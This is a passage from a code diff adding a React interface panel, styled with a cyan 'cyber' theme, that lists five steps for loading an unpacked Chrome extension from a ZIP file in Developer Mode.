+                  <span className="text-[10px] font-bold tracking-widest" style={{ color: CY.cyan, fontFamily: CY.font, letterSpacing: "0.15em" }}>
+                    INSTALLATION INSTRUCTIONS
+                  </span>
+                </div>
+                {[
+                  "Extract the downloaded ZIP file",
+                  "Open Chrome → chrome://extensions/",
+                  "Enable Developer Mode (toggle top-right)",
+                  "Click \"Load unpacked\" → select extracted folder",
+                  "Extension is now active and collecting data",
+                ].map((step, i) => (
+                  <div key={i} className="flex items-start gap-2">
+                    <span className="text-[9px] font-black w-4 flex-shrink-0 mt-0.5" style={{ color: CY.cyan, fontFamily: CY.font }}>{i + 1}</span>
+                    <span className="text-[10px]" style={{ color: "rgba(200,240,255,0.6)", fontFamily: "Rajdhani, sans-serif" }}>{step}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
+          </Panel>
         </div>
       </main>
     </div>
